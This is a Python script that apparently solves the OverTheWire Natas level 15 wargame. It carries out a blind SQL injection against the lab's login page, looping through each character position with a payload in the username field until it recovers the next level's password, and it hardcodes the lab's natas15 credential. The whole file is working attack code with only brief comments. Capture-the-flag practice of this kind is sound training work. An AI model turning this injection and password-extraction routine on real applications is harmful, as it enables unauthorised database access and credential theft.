# Vulnerability: SQL Injection (Blind)

import requests
import string
import time
import colorama
from colorama import Fore, Style


# Start time
start = time.perf_counter()


# Function to brute force each character from the character list
def password_bruteforce(pos, charList, passwordList):
    for char in charList:
        payload_data = {
            "username": f'natas16" and BINARY (select substring(password,{pos},1) from users where username="natas16")="{char}"#'}

        resp = requests.post(url=url, auth=(username, password), data=payload_data)
        if "This user exists." in resp.text:
            print(payload_data)
            passwordList.append(char)
            break


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'


# Empty list to append the passwords
passwordList = []


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Alphanumeric characters list
charList = string.ascii_letters + string.digits


# For loop to iterate through the character position in the password
for i in range(1, len(password) + 1):
    password_bruteforce(i, charList, passwordList)


# End Time
finish = time.perf_counter()


# Total time
print(f'Brute forcing finished in {round(finish - start,2)} second(s)')


# Cracked Password
print(f"\nNatas 16: {''.join(passwordList)}")
